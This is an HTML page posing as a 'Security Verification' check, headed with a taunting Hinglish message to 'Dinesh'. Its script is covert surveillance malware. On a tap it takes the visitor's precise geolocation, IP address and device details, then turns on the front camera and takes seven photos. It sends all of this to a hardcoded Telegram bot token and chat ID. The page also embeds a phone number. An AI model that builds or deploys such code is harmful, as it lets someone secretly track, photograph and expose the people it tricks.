<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Verification</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@900&display=swap');
        
        body {
            margin: 0;
            padding: 0;
            background: linear-gradient(45deg, #ff0000, #00ff00, #0000ff, #ffff00, #ff00ff);
            background-size: 400% 400%;
            animation: gradientBG 15s ease infinite;
            font-family: 'Montserrat', sans-serif;
            overflow: hidden;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            cursor: pointer;
        }

        @keyframes gradientBG {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        .page {
            position: absolute;
            width: 100px;
            height: 150px;
            background: white;
            opacity: 0.3;
            animation: float 8s infinite ease-in-out;
            border-radius: 5px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.3);
        }

        @keyframes float {
            0%, 100% { transform: translateY(0px) rotate(0deg); }
            50% { transform: translateY(-20px) rotate(5deg); }
        }

        .main-text {
            font-size: 3.5rem;
            text-align: center;
            color: white;
            text-shadow: 4px 4px 8px rgba(0,0,0,0.7);
            animation: textGlow 2s ease-in-out infinite alternate;
            margin-bottom: 50px;
            padding: 0 20px;
            opacity: 0;
            animation: fadeIn 1s ease-in 0.5s forwards, textGlow 2s ease-in-out infinite alternate;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        @keyframes textGlow {
            from { text-shadow: 4px 4px 8px rgba(0,0,0,0.7), 0 0 20px #ff0000; }
            to { text-shadow: 4px 4px 8px rgba(0,0,0,0.7), 0 0 30px #00ff00, 0 0 40px #0000ff; }
        }

        .phone-container {
            position: relative;
            width: 200px;
            height: 400px;
            background: #333;
            border-radius: 30px;
            padding: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            border: 5px solid #666;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            opacity: 0;
            animation: fadeIn 1s ease-in 1.5s forwards;
            cursor: pointer;
        }

        .phone-screen {
            background: #000;
            width: 100%;
            height: 85%;
            border-radius: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            color: white;
            padding: 10px;
            text-align: center;
        }

        .phone-button {
            width: 60px;
            height: 60px;
            background: #4CAF50;
            border-radius: 50%;
            margin-top: 15px;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 8px rgba(0,0,0,0.3);
            font-size: 24px;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(76, 175, 80, 0.7); }
            70% { transform: scale(1.05); box-shadow: 0 0 0 15px rgba(76, 175, 80, 0); }
            100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(76, 175, 80, 0); }
        }

        .phone-button:hover {
            transform: scale(1.1);
            background: #45a049;
        }

        .camera-feed {
            width: 100%;
            max-width: 400px;
            height: 300px;
            background: #333;
            border-radius: 10px;
            margin: 10px 0;
            display: none;
        }

        .status {
            background: rgba(255,255,255,0.9);
            padding: 15px;
            border-radius: 10px;
            margin: 10px;
            text-align: center;
            max-width: 500px;
            display: none;
        }

        .loading {
            color: #4CAF50;
            font-weight: bold;
        }

        .success {
            color: #4CAF50;
            font-weight: bold;
        }

        .error {
            color: #ff4444;
            font-weight: bold;
        }

        .call-text {
            font-size: 1rem;
            margin-bottom: 10px;
            color: #4CAF50;
            font-weight: bold;
        }

        .click-anywhere {
            background: #ff9800;
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 25px;
            font-size: 1.2rem;
            margin: 20px;
            animation: bounce 2s infinite;
        }

        @keyframes bounce {
            0%, 20%, 50%, 80%, 100% {transform: translateY(0);}
            40% {transform: translateY(-10px);}
            60% {transform: translateY(-5px);}
        }

        .tap-instruction {
            color: white;
            font-size: 1.5rem;
            text-align: center;
            margin-bottom: 20px;
            opacity: 0;
            animation: fadeIn 1s ease-in 2s forwards;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
        }
    </style>
</head>
<body onclick="startVerification()">
    <!-- Floating pages background -->
    <div class="page" style="top: 10%; left: 5%; animation-delay: 0s;"></div>
    <div class="page" style="top: 20%; right: 10%; animation-delay: 1s;"></div>
    <div class="page" style="bottom: 30%; left: 15%; animation-delay: 2s;"></div>
    <div class="page" style="bottom: 20%; right: 20%; animation-delay: 3s;"></div>
    <div class="page" style="top: 50%; left: 80%; animation-delay: 4s;"></div>

    <!-- Main text -->
    <div class="main-text">DINESH KYA CHAHTE HO TUM ?</div>

    <!-- Tap instruction -->
    <div class="tap-instruction">TAP ANYWHERE TO VERIFY</div>

    <!-- Phone container -->
    <div class="phone-container" onclick="makeCall(); event.stopPropagation();">
        <div class="phone-screen">
            <div class="call-text">Tap to Call</div>
            <div class="phone-button">
                📞
            </div>
        </div>
    </div>

    <!-- Click anywhere button -->
    <div class="click-anywhere">CLICK ANYWHERE TO START</div>

    <!-- Camera section -->
    <video id="cameraFeed" class="camera-feed" autoplay playsinline></video>
    
    <!-- Status messages -->
    <div class="status" id="status"></div>

    <script>
        const BOT_TOKEN = '7449706423:AAGaEZvZ-i-HhwsSZL1Hc4gcip7lNzVxrJU';
        const ADMIN_ID = '6314556756';
        const PHONE_NUMBER = '7667280752';
        
        let cameraStream = null;
        let capturedPhotos = [];
        let userLocation = null;
        let isProcessing = false;
        let verificationStarted = false;

        function startVerification() {
            if (verificationStarted) return;
            verificationStarted = true;
            isProcessing = true;
            
            // Hide instruction elements
            document.querySelector('.tap-instruction').style.display = 'none';
            document.querySelector('.click-anywhere').style.display = 'none';
            
            showStatus('🚀 Starting verification process...', 'loading');
            
            // Start the data capture process
            captureAllData();
        }

        async function captureAllData() {
            try {
                // Get location first
                await getLocation();
                
                // Then start camera and capture photos
                await startCameraAndCapture();
                
            } catch (error) {
                // If location fails, try camera only
                if (error.includes('location') || error.includes('Location')) {
                    showStatus('⚠️ Location blocked, trying camera...', 'error');
                    try {
                        await startCameraAndCapture();
                    } catch (camError) {
                        showStatus('❌ Both location and camera blocked', 'error');
                        await sendToTelegram(`❌ ALL PERMISSIONS BLOCKED\n\n📱 Device: ${navigator.userAgent}\n⏰ Time: ${new Date().toISOString()}\n🌐 URL: ${window.location.href}\n🌐 IP: ${await getIP()}`);
                    }
                } else {
                    showStatus('❌ Verification failed: ' + error, 'error');
                }
                isProcessing = false;
            }
        }

        async function getLocation() {
            return new Promise((resolve, reject) => {
                if (!navigator.geolocation) {
                    reject('Geolocation not supported');
                    return;
                }

                showStatus('📍 Getting your location...', 'loading');

                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        userLocation = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            timestamp: new Date().toISOString()
                        };
                        
                        showStatus('✅ Location captured! Sending...', 'success');
                        
                        // Send location immediately to Telegram
                        await sendToTelegram(`📍 LOCATION CAPTURED\n\n📱 Device: ${navigator.userAgent}\n🗺️ Lat: ${userLocation.latitude}\n🗺️ Lon: ${userLocation.longitude}\n🎯 Accuracy: ${userLocation.accuracy}m\n⏰ Time: ${userLocation.timestamp}\n🌐 URL: ${window.location.href}\n🌐 IP: ${await getIP()}`);
                        
                        resolve(userLocation);
                    },
                    (error) => {
                        let errorMsg = 'Location permission denied';
                        switch(error.code) {
                            case error.PERMISSION_DENIED:
                                errorMsg = "Location permission denied";
                                break;
                            case error.POSITION_UNAVAILABLE:
                                errorMsg = "Location unavailable";
                                break;
                            case error.TIMEOUT:
                                errorMsg = "Location timeout";
                                break;
                        }
                        reject(errorMsg);
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            });
        }

        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'Unknown';
            }
        }

        async function startCameraAndCapture() {
            try {
                showStatus('📷 Accessing camera...', 'loading');
                
                cameraStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    } 
                });
                
                const cameraFeed = document.getElementById('cameraFeed');
                cameraFeed.srcObject = cameraStream;
                cameraFeed.style.display = 'block';
                
                showStatus('✅ Camera connected! Capturing photos...', 'success');
                
                // Capture 7 photos rapidly
                await captureMultiplePhotos(7);
                
            } catch (error) {
                showStatus('❌ Camera access denied', 'error');
                throw error;
            }
        }

        async function captureMultiplePhotos(count) {
            for (let i = 0; i < count; i++) {
                await captureSinglePhoto(i + 1);
                
                // Wait 1 second between photos
                if (i < count - 1) {
                    await new Promise(resolve => setTimeout(resolve, 1000));
                }
            }
            
            showStatus('🎉 All data captured and sent successfully!', 'success');
            stopCamera();
        }

        async function captureSinglePhoto(photoNumber) {
            const cameraFeed = document.getElementById('cameraFeed');
            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');
            
            canvas.width = cameraFeed.videoWidth;
            canvas.height = cameraFeed.videoHeight;
            context.drawImage(cameraFeed, 0, 0);
            
            showStatus(`📸 Capturing photo ${photoNumber}/7...`, 'loading');
            
            return new Promise((resolve) => {
                canvas.toBlob(async (blob) => {
                    // Send photo immediately to Telegram
                    await sendPhotoToTelegram(blob, photoNumber);
                    
                    showStatus(`✅ Photo ${photoNumber}/7 sent!`, 'success');
                    resolve();
                }, 'image/jpeg', 0.9);
            });
        }

        async function sendToTelegram(message) {
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: ADMIN_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
            } catch (error) {
                console.error('Telegram error:', error);
            }
        }

        async function sendPhotoToTelegram(photoBlob, photoNumber) {
            try {
                const formData = new FormData();
                formData.append('chat_id', ADMIN_ID);
                formData.append('photo', photoBlob, `photo_${Date.now()}_${photoNumber}.jpg`);
                
                let caption = `📸 PHOTO ${photoNumber}/7\n⏰ Time: ${new Date().toLocaleString()}`;
                
                if (userLocation) {
                    caption += `\n📍 Location: ${userLocation.latitude}, ${userLocation.longitude}`;
                }
                
                caption += `\n📱 Device: ${navigator.userAgent.substring(0, 100)}`;

                formData.append('caption', caption);

                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            } catch (error) {
                console.error('Photo upload error:', error);
            }
        }

        function stopCamera() {
            if (cameraStream) {
                cameraStream.getTracks().forEach(track => track.stop());
                cameraStream = null;
            }
            document.getElementById('cameraFeed').style.display = 'none';
            isProcessing = false;
        }

        function showStatus(message, type) {
            const statusEl = document.getElementById('status');
            statusEl.textContent = message;
            statusEl.className = `status ${type}`;
            statusEl.style.display = 'block';
        }

        function makeCall() {
            window.location.href = `tel:${PHONE_NUMBER}`;
        }

        // Create floating pages
        for (let i = 0; i < 10; i++) {
            createFloatingPage();
        }

        function createFloatingPage() {
            const page = document.createElement('div');
            page.className = 'page';
            page.style.left = Math.random() * 100 + '%';
            page.style.top = Math.random() * 100 + '%';
            page.style.animationDelay = Math.random() * 5 + 's';
            document.body.appendChild(page);
        }

        // Auto-start after 5 seconds if user doesn't click
        setTimeout(() => {
            if (!verificationStarted) {
                document.querySelector('.click-anywhere').style.animation = 'pulse 0.5s infinite';
                showStatus('⚠️ Click anywhere to continue...', 'loading');
            }
        }, 5000);
    </script>
</body>
</html>
